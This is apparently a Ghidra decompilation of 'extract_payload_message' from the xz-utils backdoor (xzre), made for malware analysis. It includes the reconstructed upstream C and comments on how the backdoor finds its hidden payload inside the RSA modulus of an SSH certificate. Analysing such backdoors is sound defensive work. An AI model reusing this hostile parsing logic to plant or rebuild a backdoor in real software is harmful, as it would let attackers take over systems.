// /home/kali/xzre-ghidra/xzregh/107F20_extract_payload_message.c
// Function: extract_payload_message @ 0x107F20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall extract_payload_message(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief locates the RSA modulus from the given sshbuf.
 *   if found, the given @p sshbuf_data will be updated to point to the modulus data.
 *   additionally, the length of the modulus will be written to @p out_payload_size
 *
 *   @param sshbuf_data sshbuf containing the payload message
 *   @param sshbuf_size size of sshbuf data
 *   @param out_payload_size output variable that will be populated with the size of the backdoor payload, if found
 *   @param ctx the global context
 *   @return BOOL TRUE if the payload was successfully located, FALSE otherwise
 *
 * Upstream implementation excerpt (xzre/xzre_code/extract_payload_message.c):
 *     BOOL extract_payload_message(
 *     	struct sshbuf *sshbuf,
 *     	size_t sshbuf_size,
 *     	size_t *out_payload_size,
 *     	global_context_t *ctx
 *     ){
 *     	if(!sshbuf || sshbuf_size <= 6) return FALSE;
 *     	if(!out_payload_size || !ctx) return FALSE;
 *     	if(!ctx->STR_ssh_rsa_cert_v01_openssh_com) return FALSE;
 *     	if(!ctx->STR_rsa_sha2_256) return FALSE;
 *     
 *     	// overflow check 
 *     	if(sshbuf_size > PTRADD(sshbuf->d, sshbuf_size)) return FALSE;
 *     
 *     	size_t i = 0;
 *     	char *cert_type = NULL;
 *     	for(i=0; (sshbuf_size - i) >= 7; ++i){
 *     		// check for "ssh-rsa"
 *     		if(!strncmp(ctx->STR_ssh_rsa_cert_v01_openssh_com,  (const char *)&sshbuf->d[i], 7)
 *     		// check for "rsa-sha2"
 *     		|| !strncmp(ctx->STR_rsa_sha2_256, (const char *)&sshbuf->d[i], 7)){
 *     			cert_type = (char *)&sshbuf->d[i];
 *     			break;
 *     		}
 *     	}
 *     	if (i <= 7 || !cert_type){
 *     		return FALSE;
 *     	}
 *     
 *     	u8 *p = sshbuf->d;
 *     	// go backwards over  the length of the string and the length of the certificate, then extract it
 *     	// (this is the encoding used by ssh for network messages and can be seen in PHPseclib's `Strings::packSSH2`)
 *     	u32 length = __builtin_bswap32(*(u32 *)(p - 8));
 *     	if(length > 0x10000) return FALSE;
 *     
 *     	u8 *data_end = (u8 *)(cert_type + length - 8);
 *     	u8 *sshbuf_end = sshbuf->d + sshbuf_size;
 *     	// encoded data can't overflow the sshbuf size
 *     	if(data_end >= sshbuf_end) return FALSE;
 *     
 *     	size_t remaining = sshbuf_size - i;
 *     	size_t cert_type_namelen = c_strnlen(cert_type, remaining);
 *     	if(cert_type_namelen >= remaining) return FALSE;
 *     
 *     	// go past the cert type string -> RSA exponent
 *     	p = (u8 *)(cert_type + cert_type_namelen);
 *     	length = __builtin_bswap32(*(u32 *)p);
 *     	if(length > 0x10000) return FALSE;
 *     
 *     	// skip data (RSA exponent)
 *     	p += length + sizeof(u32);
 *     	if(p >= data_end) return FALSE;
 *     
 *     	// length of RSA modulus
 *     	length = __builtin_bswap32(*(u32 *)p);
 *     	if(length > 0x10000) return FALSE;
 *     
 *     	u8 *modulus_data = p;
 *     	size_t modulus_length = length;
 *     
 *     	// skip data (RSA modulus)
 *     	p += length + sizeof(u32);
 *     	if(p >= data_end) return FALSE;
 *     
 *     	// ??
 *     	if(*modulus_data == 0){
 *     		++modulus_data;
 *     		--modulus_length;
 *     	}
 *     
 *     	sshbuf->d = modulus_data;
 *     	*out_payload_size = modulus_length;
 *     	return TRUE;
 *     
 *     
 *     }
 */

BOOL extract_payload_message
               (sshbuf *sshbuf_data,size_t sshbuf_size,size_t *out_payload_size,
               global_context_t *ctx)

{
  uint *puVar1;
  char cVar2;
  uint uVar3;
  size_t i;
  size_t cert_type_namelen;
  u32 length_1;
  u32 length_2;
  u32 length;
  uint *puVar4;
  size_t remaining;
  long lVar5;
  u8 *modulus_data;
  uint *puVar6;
  size_t modulus_length;
  u8 *sshbuf_end;
  
  if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
    return 0;
  }
  if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
    if (ctx->STR_ssh_rsa_cert_v01_openssh_com == (char *)0x0) {
      return 0;
    }
    if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
      return 0;
    }
    sshbuf_end = sshbuf_data->d;
    if (CARRY8((ulong)sshbuf_end,sshbuf_size)) {
      return 0;
    }
    i = 0;
    do {
      modulus_data = sshbuf_end + i;
      remaining = 0;
      modulus_length = sshbuf_size - i;
      while( true ) {
        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[remaining];
        if (((char)modulus_data[remaining] < cVar2) || (cVar2 < (char)modulus_data[remaining]))
        break;
        remaining = remaining + 1;
        if (remaining == 7) goto LAB_00107fd1;
      }
      lVar5 = 0;
      while( true ) {
        cVar2 = ctx->STR_rsa_sha2_256[lVar5];
        if (((char)modulus_data[lVar5] < cVar2) || (cVar2 < (char)modulus_data[lVar5])) break;
        lVar5 = lVar5 + 1;
        if (lVar5 == 7) goto LAB_00107fd1;
      }
      i = i + 1;
    } while (sshbuf_size - i != 6);
    modulus_data = (u8 *)0x0;
    modulus_length = 6;
LAB_00107fd1:
    if ((7 < i) && (modulus_data != (u8 *)0x0)) {
      uVar3 = *(uint *)(modulus_data + -8);
      length_1 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length_1) {
        return 0;
      }
      puVar1 = (uint *)(modulus_data + ((ulong)length_1 - 8));
      if (sshbuf_end + sshbuf_size < puVar1) {
        return 0;
      }
      cert_type_namelen = c_strnlen((char *)modulus_data,modulus_length);
      if (modulus_length <= cert_type_namelen) {
        return 0;
      }
      puVar6 = (uint *)(modulus_data + cert_type_namelen);
      if (puVar1 <= puVar6) {
        return 0;
      }
      uVar3 = *puVar6;
      length_2 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length_2) {
        return 0;
      }
      puVar6 = (uint *)((long)puVar6 + (ulong)(length_2 + 4));
      if (puVar1 <= puVar6) {
        return 0;
      }
      uVar3 = *puVar6;
      length = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
      if (0x10000 < length) {
        return 0;
      }
      puVar4 = puVar6 + 1;
      if ((uint *)((ulong)length + (long)puVar4) <= puVar1) {
        return 0;
      }
      if ((char)puVar6[1] == '\0') {
        puVar4 = (uint *)((long)puVar6 + 5);
        length = length - 1;
      }
      sshbuf_data->d = (u8 *)puVar4;
      *out_payload_size = (ulong)length;
      return 1;
    }
  }
  return 0;
}

